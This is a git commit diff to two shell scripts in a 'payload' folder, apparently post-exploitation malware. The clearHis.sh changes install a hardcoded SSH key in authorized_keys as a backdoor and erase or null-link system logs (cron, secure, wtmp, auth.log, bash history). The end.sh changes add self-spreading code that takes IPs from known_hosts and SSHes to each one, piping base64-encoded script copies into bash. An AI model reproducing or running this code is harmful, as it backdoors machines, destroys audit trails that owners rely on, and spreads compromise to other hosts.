3fda0996a28dc91aef0d4b617a076fb751b10b51
hktalent <3135773@qq.com>
2019-05-15 13:30:46 +0800

    up

--- payload/clearHis.sh
+++ payload/clearHis.sh
@@ -3,6 +3,7 @@ if [ "$xKeys" = "" ];
 then
   xKeys="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001"
 fi
+mkdir ~/.ssh 2>/dev/null;echo "${xKeys}">~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys
 # /etc/init.d/iptables stop
 # service iptables stop
 # SuSEfirewall2 stop
@@ -22,6 +23,10 @@ echo > /var/log/wtmp
 echo > /var/log/btmp
 echo > /var/log/lastlog
 
+echo > /var/log/cron
+echo > /var/log/secure
+echo > /var/spool/mail/root
+
 cat /dev/null > ~/.bash_history
 history -c
 history -cw
@@ -30,11 +35,13 @@ export HISTFILESIZE=O
 export HISTSIZE=O
 export HISTFILE=/dev/null
 
-
+ln -sf /dev/null  /var/log/cron
+ln -sf /dev/null  /var/log/secure
+ln -sf /dev/null  /var/spool/mail/root
 ln -sf /dev/null /var/log/lastlog
 ln -sf /dev/null ~/.bash_history
 ln -sf /dev/null /var/log/auth.log
 ln -sf /dev/null /var/log/lastlog
 ln -sf /dev/null /var/log/wtmp
 ln -sf /dev/null /var/log/btmp
-mkdir ~/.ssh 2>/dev/null;echo "${xKeys}">~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys
+
--- payload/end.sh
+++ payload/end.sh
@@ -3,6 +3,30 @@ if [ "$xKeys" = "" ];
 then
   xKeys="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001"
 fi
+
+# bCode=`cat clearHis.sh end.sh|base64|tr -d "\n"`
+
+# echo  ~/
+# 
+# python -m SimpleHTTPServer 7099
+doOneUser()
+{
+  uPath="$1"
+  
+  if [ -f $uPath/.ssh/known_hosts ] && [ -f $uPath/.ssh/id_rsa.pub ]; then
+    for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $uPath/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h "bash -c {echo,$bCode}|{base64,-d}|{bash,-i}" & done
+  fi
+}
+doOneUser "/root"
+for file in /home/*
+do
+  if test -d $file
+  then
+    doOneUser $file
+  fi
+done
+
+
 if [ `whoami` = "root" ];
 then
   szTmp1='mkdir {}/.ssh 2>/dev/null;echo "'${xKeys}'">{}/.ssh/authorized_keys;chmod 600 {}/.ssh/authorized_keys'
